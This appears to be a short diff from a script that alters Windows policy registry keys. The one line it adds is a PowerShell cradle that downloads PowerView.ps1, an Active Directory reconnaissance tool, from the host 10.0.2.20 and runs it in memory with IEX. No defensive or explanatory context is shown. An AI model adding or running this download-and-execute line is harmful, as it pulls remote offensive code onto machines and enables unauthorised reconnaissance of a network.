@@ -58,6 +58,7 @@ echo Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Pol
 
 
 
+IEX (New-Object Net.WebClient).DownloadString('http://10.0.2.20:80/PowerView.ps1')
 
 
 
